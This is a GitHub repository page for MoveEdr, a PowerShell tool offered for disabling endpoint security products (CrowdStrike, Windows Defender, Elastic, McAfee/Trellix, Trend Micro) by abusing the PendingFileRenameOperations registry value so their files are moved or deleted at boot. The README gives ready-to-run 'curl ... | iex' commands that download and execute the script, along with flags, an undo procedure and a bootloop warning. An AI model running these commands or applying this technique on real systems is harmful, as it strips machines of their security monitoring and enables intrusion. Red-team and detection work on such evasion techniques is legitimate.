# https://github.com/duhirsch/MoveEdr

[Skip to content](https://github.com/duhirsch/MoveEdr#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/duhirsch/MoveEdr) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/duhirsch/MoveEdr) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/duhirsch/MoveEdr) to refresh your session.Dismiss alert

{{ message }}

[duhirsch](https://github.com/duhirsch)/ **[MoveEdr](https://github.com/duhirsch/MoveEdr)** Public

- [Notifications](https://github.com/login?return_to=%2Fduhirsch%2FMoveEdr) You must be signed in to change notification settings
- [Fork\\
14](https://github.com/login?return_to=%2Fduhirsch%2FMoveEdr)
- [Star\\
125](https://github.com/login?return_to=%2Fduhirsch%2FMoveEdr)


Permanently disable EDRs as local admin


[125\\
stars](https://github.com/duhirsch/MoveEdr/stargazers) [14\\
forks](https://github.com/duhirsch/MoveEdr/forks) [Branches](https://github.com/duhirsch/MoveEdr/branches) [Tags](https://github.com/duhirsch/MoveEdr/tags) [Activity](https://github.com/duhirsch/MoveEdr/activity)

[Star](https://github.com/login?return_to=%2Fduhirsch%2FMoveEdr)

[Notifications](https://github.com/login?return_to=%2Fduhirsch%2FMoveEdr) You must be signed in to change notification settings

# duhirsch/MoveEdr

main

[**1** Branch](https://github.com/duhirsch/MoveEdr/branches) [**0** Tags](https://github.com/duhirsch/MoveEdr/tags)

[Go to Branches page](https://github.com/duhirsch/MoveEdr/branches)[Go to Tags page](https://github.com/duhirsch/MoveEdr/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![duhirsch](https://avatars.githubusercontent.com/u/36477637?v=4&size=40)](https://github.com/duhirsch)[duhirsch](https://github.com/duhirsch/MoveEdr/commits?author=duhirsch)<br>[Update Readme.md](https://github.com/duhirsch/MoveEdr/commit/812e277084051720adfbe7d0f6a8f785025e81be)<br>2 months agoDec 19, 2025<br>[812e277](https://github.com/duhirsch/MoveEdr/commit/812e277084051720adfbe7d0f6a8f785025e81be) · 2 months agoDec 19, 2025<br>## History<br>[11 Commits](https://github.com/duhirsch/MoveEdr/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/duhirsch/MoveEdr/commits/main/) 11 Commits |
| [MoveEdr.ps1](https://github.com/duhirsch/MoveEdr/blob/main/MoveEdr.ps1 "MoveEdr.ps1") | [MoveEdr.ps1](https://github.com/duhirsch/MoveEdr/blob/main/MoveEdr.ps1 "MoveEdr.ps1") | [Update MoveEdr.ps1](https://github.com/duhirsch/MoveEdr/commit/f6a7414b3cf6d6d055bb7e6cf21831485fc200a3 "Update MoveEdr.ps1  Added McAfee/Trellix to the paths") | 2 months agoDec 5, 2025 |
| [Readme.md](https://github.com/duhirsch/MoveEdr/blob/main/Readme.md "Readme.md") | [Readme.md](https://github.com/duhirsch/MoveEdr/blob/main/Readme.md "Readme.md") | [Update Readme.md](https://github.com/duhirsch/MoveEdr/commit/812e277084051720adfbe7d0f6a8f785025e81be "Update Readme.md") | 2 months agoDec 19, 2025 |
| View all files |

## Repository files navigation

# MoveEDR

[Permalink: MoveEDR](https://github.com/duhirsch/MoveEdr#moveedr)

If you're admin you can force Windows to delete or move folders and files around immediately after booting before services are started. This can be used to disable EDRs.

## Usage

[Permalink: Usage](https://github.com/duhirsch/MoveEdr#usage)

Caution

There is an issue with CrowdStrike which results in a bootloop with the message "INACCESSIBLE\_BOOT\_DEVICE".
My theory is that either CrowdStrike itself or a software deployment solution is trying to install the missing CrowdStrike files but fails and leaves it in a broken state.
I am not sure if this depends on the elapsed time after the move or on the number of performed reboots.
Moving CrowdStrike away for the first time and rebooting works fine.
Maybe schedule the undo after the first reboot to err on the side of caution.

```
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex; MoveEdr
# Reboot!
```

The following Flags are available

- `Undo` : Undo the EDR Move, works with `CustomPaths`
- `Clear`: Clear the registry key's value
- `Print`: Print the value of the registry key in a human-readable format instead of strings terminated by null bytes
- `CustomOnly`: By default, the `CustomPaths` and `FullyCustomPaths` are added to the built-in moves. This flag ensures that _only_ your custom paths are moved.
- `CustomPaths`: Specify your own EDR Paths instead of using built-in ones. Only takes sources as inputs, to also customize the destination use `FullyCustomPaths` instead.
- `FullyCustomPaths` : Specify sources and destinations, gives you control over destination instead of using a `$Suffix`.
- `Suffix`: Use a different suffix for moved files instead of the default `_bak`
- `Dump`: Dump the values of the registry key in a format that can be used with `Load`
- `Load`: Load previously dumped values of the registry key
- `DefenderHard`: Instead of moving only select executables of the Windows Defender, move the whole `Windows Defender` folder
- `IgnoreOld`: Do not keep already existing values of the registry key, blindly overwrite them
- `Reboot`: Perform a reboot immediately after setting the registry key. Might perform Windows Updates and take a long time to reboot 😬

### Example

[Permalink: Example](https://github.com/duhirsch/MoveEdr#example)

```
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex
MoveEdr -CustomPaths "C:\Program Files\newAndShinyEdr","C:\Windows\System32\drivers\newAndShinyEdr" -Suffix "_x33f" -IgnoreOld -DefenderHard -Reboot

# Do what you need to do!

# Undo
# Same command as before, just append -Undo
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex
MoveEdr -CustomPaths "C:\Program Files\newAndShinyEdr","C:\Windows\System32\drivers\newAndShinyEdr" -Suffix "_x33f" -IgnoreOld -DefenderHard -Reboot -Undo
```

## Long Story

[Permalink: Long Story](https://github.com/duhirsch/MoveEdr#long-story)

Some programs have a feature which prevents even local administrators from uninstalling or disabling them. Most of the time these are AVs/EDRs which prompt you for a deactivation password, even when you are administrator.

Here is a trick to disable them by moving files and folders around so that they can not be started on the next boot.

[SysInternals's PendMoves](https://learn.microsoft.com/en-us/sysinternals/downloads/pendmoves) provides `movefile.exe` which has the following explanation:

> There are several applications, such as service packs and hotfixes, that must replace a file that's in use and is unable to. Windows therefore provides the MoveFileEx API to rename or delete a file and allows the caller to specify that they want the operation to take place the next time the system boots, before the files are referenced. Session Manager performs this task by reading the registered rename and delete commands from the HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations value.

How exactly does `MoveFileEx` do this? Let's check the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa#remarks) :

> The function stores the locations of the files to be renamed at restart in the following registry value: HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations
>
> This registry value is of type REG\_MULTI\_SZ. Each rename operation stores one of the following NULL-terminated strings, depending on whether the rename is a delete or not:
>
> szSrcFile\\0\\0
>
> szSrcFile\\0szDstFile\\0

This means that we can achieve the same effect as `movefile.exe`by creating the registry key `PendingFileRenameOperations`and enter the paths of the files/directories we want to delete in the correct `REG_MULTI_SZ` format.

The `MoveEdr` script automates creating the correct registry keys for the following AVs/EDRs:

- [ ]  Bitdefender
- [ ]  Blackberry Cylance
- [ ]  Checkpoint
- [ ]  Cisco
- [x]  CrowdStrike
- [ ]  Cyberreason
- [x]  Elastic
- [ ]  Fortinet
- [ ]  Kaspersky
- [ ]  Malwarebytes
- [x]  McAfee (thanks to [mschillinger](https://github.com/mschillinger))
- [ ]  Palo Alto Cortex
- [ ]  Sentinel One
- [ ]  Symantec
- [x]  Trellix (previously FireEye, thanks to [@0x48756773](https://github.com/0x48756773))
- [x]  Trend Micro Security Agent
- [ ]  VMware Carbon Black
- [ ]  Webroot
- [x]  Windows Defender
- [x]  Windows Defender for Endpoint

## About

Permanently disable EDRs as local admin


### Resources

[Readme](https://github.com/duhirsch/MoveEdr#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/duhirsch/MoveEdr).

[Activity](https://github.com/duhirsch/MoveEdr/activity)

### Stars

[**125**\\
stars](https://github.com/duhirsch/MoveEdr/stargazers)

### Watchers

[**0**\\
watching](https://github.com/duhirsch/MoveEdr/watchers)

### Forks

[**14**\\
forks](https://github.com/duhirsch/MoveEdr/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fduhirsch%2FMoveEdr&report=duhirsch+%28user%29)

## [Contributors\  3](https://github.com/duhirsch/MoveEdr/graphs/contributors)

- [![@duhirsch](https://avatars.githubusercontent.com/u/36477637?s=64&v=4)](https://github.com/duhirsch)[**duhirsch**](https://github.com/duhirsch)
- [![@0x48756773](https://avatars.githubusercontent.com/u/11379760?s=64&v=4)](https://github.com/0x48756773)[**0x48756773** 0x48756773](https://github.com/0x48756773)
- [![@mschillinger](https://avatars.githubusercontent.com/u/25103418?s=64&v=4)](https://github.com/mschillinger)[**mschillinger** Marco Schillinger](https://github.com/mschillinger)

## Languages

- [PowerShell100.0%](https://github.com/duhirsch/MoveEdr/search?l=powershell)

You can’t perform that action at this time.